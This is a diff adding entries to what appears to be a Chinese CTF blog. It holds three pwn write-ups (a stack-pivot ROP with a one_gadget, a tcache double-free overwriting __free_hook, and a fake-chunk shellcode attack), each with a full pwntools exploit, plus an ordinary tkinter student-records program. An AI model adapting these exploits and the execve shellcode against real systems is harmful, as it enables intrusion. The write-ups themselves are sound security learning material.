@@ -115,6 +115,526 @@
     
     <div class="recent-post-item">
 
+      <a href="/2024/02/29/checkin/" class="item-title">checkin</a>
+      
+      <time datetime="2024-02-29T06:36:05.000Z">
+        2024-02-29
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- 挺有意思的一道栈迁移
+s1是全局变量，这里写rop泄露got表地址
+为了再一次执行程序，rop后面接的不是puts_plt
+而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。
+buf只能溢出到rbp，但是有两次leave，一个是sub_4018C7函数里的
+上一个函数结束后到sub_401876函数里的，刚好能执行两次leave。
+不过这里(unsigned int)sub_401974(buf)属实不太懂，太抽象了，也不知道它具体是怎么检查的两次的payload不太一样。payload1payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
+p.sendafter(&#39;&gt;&#39;,payload1)
+
+payload2=b&#39;admin\x00\x00\x00&#39;+p64(0)*3+p64(bss)
+p.sendafter(&#39;Pass&#39;,payload2)
+
+payload2payload1=b&#39;admin\x00\x00\x00&#39;*3+p64(one_gadg -->
+        <!-- </div> -->
+
+        
+        <h5 id="挺有意思的一道栈迁移"><a href="#挺有意思的一道栈迁移" class="headerlink" title="挺有意思的一道栈迁移"></a>挺有意思的一道栈迁移</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XZ5K.png" alt="image-20240229143947006"></p>
+<h5 id="s1是全局变量，这里写rop泄露got表地址"><a href="#s1是全局变量，这里写rop泄露got表地址" class="headerlink" title="s1是全局变量，这里写rop泄露got表地址"></a>s1是全局变量，这里写rop泄露got表地址</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7Xnr2.png" alt="image-20240229144209910"></p>
+<h5 id="为了再一次执行程序，rop后面接的不是puts-plt"><a href="#为了再一次执行程序，rop后面接的不是puts-plt" class="headerlink" title="为了再一次执行程序，rop后面接的不是puts_plt"></a>为了再一次执行程序，rop后面接的不是puts_plt</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XpyV.png" alt="image-20240229144608441"></p>
+<h5 id="而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。"><a href="#而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。" class="headerlink" title="而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。"></a>而是调用puts函数的地址，既能泄露got表地址，又能再执行一次程序。</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7XMJI.png" alt="image-20240229144545776"></p>
+<h5 id="buf只能溢出到rbp，但是有两次leave，一个是sub-4018C7函数里的"><a href="#buf只能溢出到rbp，但是有两次leave，一个是sub-4018C7函数里的" class="headerlink" title="buf只能溢出到rbp，但是有两次leave，一个是sub_4018C7函数里的"></a>buf只能溢出到rbp，但是有两次leave，一个是sub_4018C7函数里的</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7rKsK.png" alt="image-20240229151653874"></p>
+<h5 id="上一个函数结束后到sub-401876函数里的，刚好能执行两次leave。"><a href="#上一个函数结束后到sub-401876函数里的，刚好能执行两次leave。" class="headerlink" title="上一个函数结束后到sub_401876函数里的，刚好能执行两次leave。"></a>上一个函数结束后到sub_401876函数里的，刚好能执行两次leave。</h5><p><img src="https://i0.imgs.ovh/2024/02/28/7rbi2.png" alt="image-20240229151743757"></p>
+<h5 id="不过这里-unsigned-int-sub-401974-buf-属实不太懂，太抽象了，也不知道它具体是怎么检查的"><a href="#不过这里-unsigned-int-sub-401974-buf-属实不太懂，太抽象了，也不知道它具体是怎么检查的" class="headerlink" title="不过这里(unsigned int)sub_401974(buf)属实不太懂，太抽象了，也不知道它具体是怎么检查的"></a>不过这里(unsigned int)sub_401974(buf)属实不太懂，太抽象了，也不知道它具体是怎么检查的</h5><h5 id="两次的payload不太一样。"><a href="#两次的payload不太一样。" class="headerlink" title="两次的payload不太一样。"></a>两次的payload不太一样。</h5><h5 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h5><pre><code class="lang-py">payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
+p.sendafter(&#39;&gt;&#39;,payload1)
+
+payload2=b&#39;admin\x00\x00\x00&#39;+p64(0)*3+p64(bss)
+p.sendafter(&#39;Pass&#39;,payload2)
+</code></pre>
+<h5 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h5><pre><code class="lang-py">payload1=b&#39;admin\x00\x00\x00&#39;*3+p64(one_gadget)
+
+p.sendafter(&#39;&gt;&#39;,payload1)
+payload2=b&#39;admin\x00\x00\x00&#39;*4+p64(bss+0x10)
+p.sendafter(&#39;Pass&#39;,payload2)
+</code></pre>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+p=remote(&quot;node5.buuoj.cn&quot;,25691)
+#p=process(&quot;./login_pro&quot;)
+context.log_level=&quot;debug&quot;
+libc=ELF(&#39;./libc.So.6&#39;)
+bss=0x602400
+pop_rdi=0x401ab3
+puts_plt=0x4018b5
+puts_got=0x602028
+payload1=b&#39;admin\x00\x00\x00&#39;
+payload1+=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)
+p.sendafter(&#39;&gt;&#39;,payload1)
+
+payload2=b&#39;admin\x00\x00\x00&#39;+p64(0)*3+p64(bss)
+p.sendafter(&#39;Pass&#39;,payload2)
+p.recvuntil(&#39;BaileGeBai\n&#39;)
+puts_got=u64(p.recvuntil(&#39;\n&#39;,drop=True).ljust(8,b&#39;\x00&#39;))
+print(hex(puts_got))
+base=puts_got-libc.sym[&#39;puts&#39;]
+one=[0x45226,0x4527a,0xf03a4,0xf1247]
+one_gadget=base+one[1]
+#gdb.attach(p)
+sleep(1)
+
+payload1=b&#39;admin\x00\x00\x00&#39;*3+p64(one_gadget)
+
+p.sendafter(&#39;&gt;&#39;,payload1)
+payload2=b&#39;admin\x00\x00\x00&#39;*4+p64(bss+0x10)
+p.sendafter(&#39;Pass&#39;,payload2)
+
+#p.sendline(payload)
+
+p.interactive()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2024/02/29/checkin/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2024/01/22/ciscn-2019-es-1/" class="item-title">ciscn_2019_es_1</a>
+      
+      <time datetime="2024-01-21T16:08:54.000Z">
+        2024-01-22
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- ciscn_2019_es_1checksec一下，保护全开
+addshow函数，可以输出我们想要的地址然后算偏移
+delete函数，没有把指针置零，存在UAF漏洞
+过程虽然理清，但仍然有点懵逼。先创三个堆add(0x410,&quot;AAAA&quot;)
+add(0x20,&quot;AAAA&quot;)
+add(0x20,&quot;bin/sh&quot;)
+
+delete(0)
+
+libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。
+show(0)
+
+malloc_hook_addr = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-96-0x10
+base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;]
+fre -->
+        <!-- </div> -->
+
+        
+        <h4 id="ciscn-2019-es-1"><a href="#ciscn-2019-es-1" class="headerlink" title="ciscn_2019_es_1"></a>ciscn_2019_es_1</h4><h4 id="checksec一下，保护全开"><a href="#checksec一下，保护全开" class="headerlink" title="checksec一下，保护全开"></a>checksec一下，保护全开</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJtxT.png" alt="image-20230921162920468"></p>
+<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add<img src="https://i0.imgs.ovh/2024/01/22/sJzLl.png" alt="image-20230921163026621"></h4><h4 id="show函数，可以输出我们想要的地址然后算偏移"><a href="#show函数，可以输出我们想要的地址然后算偏移" class="headerlink" title="show函数，可以输出我们想要的地址然后算偏移"></a>show函数，可以输出我们想要的地址然后算偏移</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJgZp.png" alt="image-20230921163115792"></p>
+<h4 id="delete函数，没有把指针置零，存在UAF漏洞"><a href="#delete函数，没有把指针置零，存在UAF漏洞" class="headerlink" title="delete函数，没有把指针置零，存在UAF漏洞"></a>delete函数，没有把指针置零，存在UAF漏洞</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJcDR.png" alt="image-20230921163210886"></p>
+<h4 id="过程虽然理清，但仍然有点懵逼。"><a href="#过程虽然理清，但仍然有点懵逼。" class="headerlink" title="过程虽然理清，但仍然有点懵逼。"></a>过程虽然理清，但仍然有点懵逼。</h4><h4 id="先创三个堆"><a href="#先创三个堆" class="headerlink" title="先创三个堆"></a>先创三个堆</h4><pre><code class="lang-py">add(0x410,&quot;AAAA&quot;)
+add(0x20,&quot;AAAA&quot;)
+add(0x20,&quot;bin/sh&quot;)
+
+delete(0)
+</code></pre>
+<h4 id="libc是2-27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main-arena-96这个地址，show函数把它输出出来并算出偏移量并算出free-hook的地址和system函数的地址。"><a href="#libc是2-27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main-arena-96这个地址，show函数把它输出出来并算出偏移量并算出free-hook的地址和system函数的地址。" class="headerlink" title="libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。"></a>libc是2.27版本，就会有tachebin机制，free的大小大于0x400则可以绕过这个机制，而他的fd和bk指针都会指向main_arena+96这个地址，show函数把它输出出来并算出偏移量并算出free_hook的地址和system函数的地址。</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJR7N.png" alt="image-20230921163638325"></p>
+<pre><code class="lang-py">show(0)
+
+malloc_hook_addr = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-96-0x10
+base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;]
+free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;]
+system_addr = base_addr + libc.symbols[&#39;system&#39;]
+</code></pre>
+<h4 id="然后用double-free，free两次堆2，然后堆2的如下，以及bin"><a href="#然后用double-free，free两次堆2，然后堆2的如下，以及bin" class="headerlink" title="然后用double free，free两次堆2，然后堆2的如下，以及bin"></a>然后用double free，free两次堆2，然后堆2的如下，以及bin</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJ1ju.png" alt="image-20230921164207791"></p>
+<p><img src="https://i0.imgs.ovh/2024/01/22/sJUkd.png" alt="image-20230921164236453"></p>
+<h4 id="bin指针链0x000055ac61f846c0这个地址记录了它本身"><a href="#bin指针链0x000055ac61f846c0这个地址记录了它本身" class="headerlink" title="bin指针链0x000055ac61f846c0这个地址记录了它本身"></a>bin指针链0x000055ac61f846c0这个地址记录了它本身</h4><h4 id="这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free-hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free-hook，我们再malloc"><a href="#这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free-hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free-hook，我们再malloc" class="headerlink" title="这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free_hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free_hook，我们再malloc"></a>这里也许是tachebin的机制，再次malloc时，会先创建一个堆记录下一个堆的地址，而下一个堆正是我们add函数的过程，在0x000055ac61f846c0这个地址写入的是free_hook的地址，但是它依然还是在bin链中的，这就很不解，明明已经被使用了，这时bin链的指针指到了free_hook，我们再malloc</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJja2.png" alt="image-20230921164455578"></p>
+<h4 id="这时bin链的指针指到了free-hook，我们再malloc两次就能把free-hook函数的地址内容改成system函数的地址-而都同add函数一样正常mollc，参数bin-sh放在堆3"><a href="#这时bin链的指针指到了free-hook，我们再malloc两次就能把free-hook函数的地址内容改成system函数的地址-而都同add函数一样正常mollc，参数bin-sh放在堆3" class="headerlink" title="这时bin链的指针指到了free_hook，我们再malloc两次就能把free_hook函数的地址内容改成system函数的地址,而都同add函数一样正常mollc，参数bin/sh放在堆3"></a>这时bin链的指针指到了free_hook，我们再malloc两次就能把free_hook函数的地址内容改成system函数的地址,而都同add函数一样正常mollc，参数bin/sh放在堆3</h4><p><img src="https://i0.imgs.ovh/2024/01/22/sJitK.png" alt="image-20230921164925744"></p>
+<p><img src="https://i0.imgs.ovh/2024/01/22/sJ5wj.png" alt="image-20230921165411511"></p>
+<p>exp</p>
+<pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node4.buuoj.cn&quot;,28022)
+p=process(&quot;./ciscn_2019_es_1&quot;)
+context.log_level=&quot;debug&quot;
+elf=ELF(&quot;./ciscn_2019_es_1&quot;)
+libc=ELF(&quot;./libc-2.27.so&quot;)
+
+def add(size,name):
+    p.recvuntil(&quot;choice:&quot;)
+    p.sendline(&quot;1&quot;)
+    p.recvuntil(&quot;name&quot;)
+    p.sendline(str(int(size)))
+    p.recvuntil(&quot;name:&quot;)
+    p.sendline(name)
+    p.recvuntil(&quot;call&quot;)
+    p.sendline(name)
+
+def show(dex):
+    p.sendlineafter(&quot;choice:&quot;,&#39;2&#39;)
+    p.sendlineafter(&quot;index:&quot;,str(dex))  
+
+def delete(dex):
+    p.sendlineafter(&quot;choice:&quot;,&#39;3&#39;)
+    p.sendlineafter(&quot;index:\n&quot;,str(dex)) 
+
+
+add(0x410,&quot;AAAA&quot;)
+add(0x20,&quot;AAAA&quot;)
+add(0x20,&quot;bin/sh&quot;)
+
+delete(0)
+show(0)
+
+malloc_hook_addr = u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-96-0x10
+base_addr = malloc_hook_addr - libc.symbols[&#39;__malloc_hook&#39;]
+free_hook = base_addr + libc.symbols[&#39;__free_hook&#39;]
+system_addr = base_addr + libc.symbols[&#39;system&#39;]
+
+delete(1)
+
+delete(1)
+
+gdb.attach(p)
+sleep(1)
+
+
+add(0x20,p64(free_hook))
+add(0x20,&#39;MMMM&#39;)
+
+add(0x20,p64(system_addr))
+delete(2)
+
+#p.sendline(payload)
+
+
+p.interactive()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2024/01/22/ciscn-2019-es-1/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2024/01/14/lctf2016_pwn200/" class="item-title">lctf2016_pwn200</a>
+      
+      <time datetime="2024-01-14T12:22:41.000Z">
+        2024-01-14
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- lctf2016_pwn200一道有点难的堆题这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来
+下面小a的末尾的rbp寄存器存着主函数的rbp
+后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode
+shellcode第一个得是’\x00’防止复制过去，造成影响申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构
+
+然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。shellcode的结构应该写出这样的结构。
+payload=3*p64(0)+p64(rbp-0xc0+1)
+
+再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcodefrom pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node4.buuo -->
+        <!-- </div> -->
+
+        
+        <h3 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a>lctf2016_pwn200</h3><h4 id="一道有点难的堆题"><a href="#一道有点难的堆题" class="headerlink" title="一道有点难的堆题"></a>一道有点难的堆题</h4><h4 id="这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来"><a href="#这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来" class="headerlink" title="这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来"></a>这是主函数的结构，当我们输入满0x40时能够把主函数的ebp的地址泄露出来</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ3VW.png" alt="image-20240114222351986"></p>
+<h4 id="下面小a的末尾的rbp寄存器存着主函数的rbp"><a href="#下面小a的末尾的rbp寄存器存着主函数的rbp" class="headerlink" title="下面小a的末尾的rbp寄存器存着主函数的rbp"></a>下面小a的末尾的rbp寄存器存着主函数的rbp</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZfWv.png" alt="image-20240114222408532"></p>
+<h4 id="后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk-还有我们的shellcode"><a href="#后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk-还有我们的shellcode" class="headerlink" title="后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode"></a>后面还调用了两个函数，说明这两个函数的栈帧离得不远，而这个函数，可以构造我们的fakechunk,还有我们的shellcode</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZmge.png" alt="image-20240114222423230"></p>
+<h4 id="shellcode第一个得是’-x00’防止复制过去，造成影响"><a href="#shellcode第一个得是’-x00’防止复制过去，造成影响" class="headerlink" title="shellcode第一个得是’\x00’防止复制过去，造成影响"></a>shellcode第一个得是’\x00’防止复制过去，造成影响</h4><h4 id="申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构"><a href="#申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构" class="headerlink" title="申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构"></a>申请得到得堆的地址和给过去的不太一样，这是构造的栈的结构</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ6N3.png" alt="image-20240114222437905"></p>
+<p><img src="https://i0.imgs.ovh/2024/01/14/hZkp9.png" alt="image-20240114222456777"></p>
+<h4 id="然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。"><a href="#然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。" class="headerlink" title="然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。"></a>然后ptr指针的值被覆盖成栈上的，等我们free再malloc的时候就能申请到这，但是大小得是0x30，因为我们构造的fakechunk的大小是0x40的大小，这样才能malloc到我们的栈上，从而覆盖到返回地址，而返回地址得写成shellcode开始的地址。</h4><h4 id="shellcode的结构应该写出这样的结构。"><a href="#shellcode的结构应该写出这样的结构。" class="headerlink" title="shellcode的结构应该写出这样的结构。"></a>shellcode的结构应该写出这样的结构。</h4><p><img src="https://i0.imgs.ovh/2024/01/14/hZ07O.png" alt="image-20240114222514160"></p>
+<pre><code class="lang-py">payload=3*p64(0)+p64(rbp-0xc0+1)
+</code></pre>
+<h4 id="再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode"><a href="#再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode" class="headerlink" title="再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode"></a>再次申请覆盖掉返回地址，最后程序返回的时候会执行shellcode</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://i0.imgs.ovh/2024/01/14/hZpiJ.png" alt="image-20231010144445729"></h4><pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+#p=remote(&quot;node4.buuoj.cn&quot;,28868)
+p=process(&quot;./pwn200&quot;)
+
+context.log_level=&quot;debug&quot;
+payload=&#39;a&#39;*0x30
+p.sendafter(&#39;u?&#39;,payload)
+p.recvuntil(&#39;a&#39;*0x30)
+rbp=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+print(hex(rbp))
+
+
+shellcode=&quot;\x00\x31\xf6\x48\xbb\x2f\x62\x69\x6e&quot;
+shellcode+= &quot;\x2f\x2f\x73\x68\x56\x53\x54\x5f&quot;
+shellcode += &quot;\x6a\x3b\x58\x31\xd2\x0f\x05&quot;
+
+payload=(shellcode+2*p64(0)+p64(0X41)).ljust(0x38,&#39;\x00&#39;)  #gouzhao fakebchunk
+payload+=p64(rbp-0x90)
+
+
+p.sendlineafter(&#39;id ~~?&#39;,&#39;31&#39;)
+
+print(hex(rbp-0x90))
+
+p.sendlineafter(&#39;money~&#39;,payload)
+
+p.sendlineafter(&#39;choice : &#39;,&#39;2&#39;)
+#p.recvuntil(&#39;\n&#39;)
+gdb.attach(p)
+sleep(1)
+p.sendlineafter(&#39;choice : &#39;,&#39;1&#39;)
+
+
+p.sendlineafter(&#39;long?&#39;,&#39;48&#39;)
+
+payload=3*p64(0)+p64(rbp-0xc0+1)
+
+p.sendlineafter(&#39;money : &#39;,payload)
+
+p.sendlineafter(&#39;choice : &#39;,&#39;3&#39;)
+
+#p.sendline(payload)
+
+p.interactive()
+</code></pre>
+
+        
+
+
+        <span>
+          <a class="article-read" href="/2024/01/14/lctf2016_pwn200/"> Read more -->
+          </span>
+        </div>
+
+        
+    
+    <div class="recent-post-item">
+
+      <a href="/2023/12/25/python%E8%AF%BE%E8%AE%BE/" class="item-title">python课设</a>
+      
+      <time datetime="2023-12-25T14:49:46.000Z">
+        2023-12-25
+      </time>
+      
+      <!-- <div class="article-digest"> -->
+        <!-- import tkinter as tk
+from tkinter import messagebox, simpledialog
+import json
+import re
+import os
+
+STUDENT_FILE = &#39;students.json&#39;
+
+def load_students():
+    if not os.path.exists(STUDENT_FILE):
+        return []
+
+    with open(STUDENT_FILE, &#39;r&#39;, encoding=&#39;utf-8&#39;) as file:
+        return json.load(file)
+
+def save_students(students):
+    with open(STUDENT_FILE, &#39;w&#39;, encoding=&#39;utf-8&#39;) as file:
+        json.dump(students, file, ensure_ascii=False, indent=2)
+
+de -->
+        <!-- </div> -->
+
+        
+        <pre><code class="lang-py">import tkinter as tk
+from tkinter import messagebox, simpledialog
+import json
+import re
+import os
+
+STUDENT_FILE = &#39;students.json&#39;
+
+def load_students():
+    if not os.path.exists(STUDENT_FILE):
+        return []
+
+    with open(STUDENT_FILE, &#39;r&#39;, encoding=&#39;utf-8&#39;) as file:
+        return json.load(file)
+
+def save_students(students):
+    with open(STUDENT_FILE, &#39;w&#39;, encoding=&#39;utf-8&#39;) as file:
+        json.dump(students, file, ensure_ascii=False, indent=2)
+
+def show_students(students):
+    sorted_students = sorted(students, key=lambda x: x[&#39;id&#39;])  # 按学号排序
+    students_text = &quot;&quot;
+    for student in sorted_students:
+        students_text += f&quot;学号: &#123;student[&#39;id&#39;]&#125;\n&quot;
+        students_text += f&quot;姓名: &#123;student[&#39;name&#39;]&#125;\n&quot;
+        students_text += f&quot;年龄: &#123;student[&#39;age&#39;]&#125;\n&quot;
+        students_text += f&quot;性别: &#123;student[&#39;gender&#39;]&#125;\n\n&quot;
+    return students_text
+
+def validate_id(student_id):
+    return bool(student_id.strip())
+
+def add_student(students):
+    dialog = tk.Toplevel()
+    dialog.title(&quot;添加学生信息&quot;)
+    dialog.geometry(&quot;250x200+900+400&quot;)
+    tk.Label(dialog, text=&quot;学号：&quot;).grid(row=0, column=0, padx=10, pady=5)
+    id_var = tk.StringVar()
+    tk.Entry(dialog, textvariable=id_var).grid(row=0, column=1, padx=10, pady=5)
+
+    tk.Label(dialog, text=&quot;姓名：&quot;).grid(row=1, column=0, padx=10, pady=5)
+    name_var = tk.StringVar()
+    tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5)
+
+    tk.Label(dialog, text=&quot;年龄：&quot;).grid(row=2, column=0, padx=10, pady=5)
+    age_var = tk.StringVar()
+    tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5)
+
+    tk.Label(dialog, text=&quot;性别：&quot;).grid(row=3, column=0, padx=10, pady=5)
+    gender_var = tk.StringVar()
+    gender_var.set(&quot;男&quot;)
+    gender_menu = tk.OptionMenu(dialog, gender_var, &quot;男&quot;, &quot;女&quot;)
+    gender_menu.grid(row=3, column=1, padx=10, pady=5)
+
+    def add_student_action():
+        student_info = &#123;
+            &#39;id&#39;: id_var.get(),
+            &#39;name&#39;: name_var.get(),
+            &#39;age&#39;: age_var.get(),
+            &#39;gender&#39;: gender_var.get()
+        &#125;
+
+        if not student_info[&#39;id&#39;] or not validate_id(student_info[&#39;id&#39;]):
+            messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;)
+            return
+
+        if any(student[&#39;id&#39;] == student_info[&#39;id&#39;] for student in students):
+            messagebox.showerror(&quot;错误&quot;, &quot;学号已存在，请重新输入。&quot;)
+            return
+
+        students.append(student_info)
+        messagebox.showinfo(&quot;成功&quot;, &quot;学生信息添加成功！&quot;)
+        dialog.destroy()
+
+    add_button = tk.Button(dialog, text=&quot;添加&quot;, command=add_student_action)
+    add_button.grid(row=4, columnspan=2, pady=10)
+
+def edit_student(students):
+    student_id = simpledialog.askstring(&quot;输入&quot;, &quot;请输入要编辑的学号：&quot;)
+    if not student_id or not validate_id(student_id):
+        messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;)
+        return
+
+    student = next((s for s in students if s[&#39;id&#39;] == student_id), None)
+    if student:
+        messagebox.showinfo(&quot;信息&quot;, f&quot;学号: &#123;student[&#39;id&#39;]&#125;\n姓名: &#123;student[&#39;name&#39;]&#125;\n年龄: &#123;student[&#39;age&#39;]&#125;\n性别: &#123;student[&#39;gender&#39;]&#125;&quot;)
+
+        dialog = tk.Toplevel()
+        dialog.title(&quot;编辑学生信息&quot;)
+        dialog.geometry(&quot;250x200+900+400&quot;)
+        tk.Label(dialog, text=&quot;姓名：&quot;).grid(row=1, column=0, padx=10, pady=5)
+        name_var = tk.StringVar(value=student[&#39;name&#39;])
+        tk.Entry(dialog, textvariable=name_var).grid(row=1, column=1, padx=10, pady=5)
+
+        tk.Label(dialog, text=&quot;年龄：&quot;).grid(row=2, column=0, padx=10, pady=5)
+        age_var = tk.StringVar(value=str(student[&#39;age&#39;]))
+        tk.Entry(dialog, textvariable=age_var).grid(row=2, column=1, padx=10, pady=5)
+
+        tk.Label(dialog, text=&quot;性别：&quot;).grid(row=3, column=0, padx=10, pady=5)
+        gender_var = tk.StringVar(value=student[&#39;gender&#39;])
+        gender_menu = tk.OptionMenu(dialog, gender_var, &quot;男&quot;, &quot;女&quot;)
+        gender_menu.grid(row=3, column=1, padx=10, pady=5)
+
+        def edit_student_action():
+            student[&#39;name&#39;] = name_var.get()
+            student[&#39;age&#39;] = int(age_var.get())
+            student[&#39;gender&#39;] = gender_var.get()
+            messagebox.showinfo(&quot;成功&quot;, &quot;学生信息编辑成功！&quot;)
+            dialog.destroy()
+
+        edit_button = tk.Button(dialog, text=&quot;编辑&quot;, command=edit_student_action)
+        edit_button.grid(row=4, columnspan=2, pady=10)
+    else:
+        messagebox.showerror(&quot;错误&quot;, &quot;未找到该学生信息。&quot;)
+
+def delete_student(students):
+    student_id = simpledialog.askstring(&quot;输入&quot;, &quot;请输入要删除的学号：&quot;)
+    if not student_id or not validate_id(student_id):
+        messagebox.showerror(&quot;错误&quot;, &quot;学号格式错误，请重新输入。&quot;)
+        return
+
+    student = next((s for s in students if s[&#39;id&#39;] == student_id), None)
+    if student:
+        students.remove(student)
+        messagebox.showinfo(&quot;成功&quot;, &quot;学生信息删除成功！&quot;)
+    else:
+        messagebox.showerror(&quot;错误&quot;, &quot;未找到该学生信息。&quot;)
+
+def main():
+    root = tk.Tk()
+    root.title(&quot;学生信息管理系统&quot;)
+
+    students = load_students()
+
+    window_width = 800
+    window_height = 500
+    screen_width = root.winfo_screenwidth()
+    screen_height = root.winfo_screenheight()
+
+    x_position = (screen_width - window_width) // 2
+    y_position = (screen_height - window_height) // 2
+
+    root.geometry(f&quot;&#123;window_width&#125;x&#123;window_height&#125;+&#123;x_position&#125;+&#123;y_position&#125;&quot;)
+
+    def show_students_command():
+        students_text = show_students(students)
+        messagebox.showinfo(&quot;学生信息&quot;, students_text)
+
+    def add_student_command():
+        add_student(students)
+
+    def delete_student_command():
+        delete_student(students)
+
+    def edit_student_command():
+        edit_student(students)
+
+    def save_and_exit():
+        save_students(students)
+        root.destroy()
+
+    show_students_button = tk.Button(root, text=&quot;显示所有学生信息&quot;, command=show_students_command)
+    show_students_button.pack()
+
+    add_student_button = tk.Button(root, text=&quot;添加学生信息&quot;, command=add_student_command)
+    add_student_button.pack()
+
+    delete_student_button = tk.Button(root, text=&quot;删除学生信息&quot;, command=delete_student_command)
+    delete_student_button.pack()
+
+    edit_student_button = tk.Button(root, text=&quot;编辑学生信息&quot;, command=edit_student_command)
+    edit_student_button.pack()
+
+    exit_button = tk.Button(root, text=&quot;保存并退出&quot;, command=save_and_exit)
+    exit_button.pack()
+
